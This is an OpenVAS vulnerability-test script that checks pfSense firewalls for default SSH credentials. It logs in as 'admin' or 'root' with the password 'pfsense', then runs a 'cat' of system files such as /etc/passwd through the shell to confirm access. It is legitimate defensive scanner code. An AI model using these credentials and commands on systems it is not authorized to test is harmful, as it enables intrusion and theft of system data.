###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_pfsense_default_ssh_credentials.nasl 13571 2019-02-11 11:00:12Z cfischer $
#
# pfSense Default SSH Credentials
#
# Authors:
# Adrian Steins <adrian.steins@greenbone.net>
#
# Copyright:
# Copyright (C) 2017 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.112123");
  script_version("$Revision: 13571 $");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"$Date: 2019-02-11 12:00:12 +0100 (Mon, 11 Feb 2019) $");
  script_tag(name:"creation_date", value:"2017-11-15 13:32:16 +0100 (Wed, 15 Nov 2017)");
  script_name("pfSense Default SSH Credentials");
  script_category(ACT_ATTACK);
  script_family("Default Accounts");
  script_copyright("This script is Copyright (C) 2017 Greenbone Networks GmbH");
  script_dependencies("ssh_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/ssh", 22);
  script_require_keys("Host/runs_unixoide");
  script_mandatory_keys("ssh/server_banner/available");

  script_tag(name:"summary", value:"pfSense is prone to a default account authentication bypass vulnerability via SSH.");

  script_tag(name:"impact", value:"This issue may be exploited by a remote attacker to gain access to sensitive information or modify the system configuration.");

  script_tag(name:"vuldetect", value:"Try to login with known credentials.");

  script_tag(name:"solution", value:"Change the password.");

  script_tag(name:"solution_type", value:"Mitigation");
  script_tag(name:"qod_type", value:"exploit");

  script_xref(name:"URL", value:"https://www.question-defense.com/2012/11/19/pfsense-default-login");
  script_xref(name:"URL", value:"https://doc.pfsense.org/index.php/HOWTO_enable_SSH_access");

  exit(0);
}

include("host_details.inc");
include("ssh_func.inc");
include("misc_func.inc");

port = get_ssh_port( default:22 );

password = "pfsense";
report = 'It was possible to login to pfSense via SSH with the following credentials:\n';

files = traversal_files("linux");

foreach username( make_list( "admin", "root" ) ) {

  if( ! soc = open_sock_tcp( port ) ) exit( 0 );

  login = ssh_login( socket:soc, login:username, password:password, pub:NULL, priv:NULL, passphrase:NULL );

  if( login == 0 ) {

    foreach pattern( keys ( files ) ) {

      file = files[pattern];

      rcv = ssh_cmd( socket:soc, cmd:'8\n && cat /' + file, nosh:TRUE, pty:TRUE );

      if( 'Welcome to pfSense' >< rcv && egrep( string:rcv, pattern:pattern ) ) {
        vuln = TRUE;
        report += '\nUsername: "' + username  + '", Password: "' + password + '"';
      }

      if( passwd = egrep( pattern:pattern, string:rcv ) ) {
        passwd_report += '\nIt was also possible to execute "cat /' + file + '" as "' + username + '". Result:\n\n' + passwd;
      }
    }
  }
  close( soc );
}

if( vuln ) {
  if (passwd_report) report += '\n' + passwd_report;
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );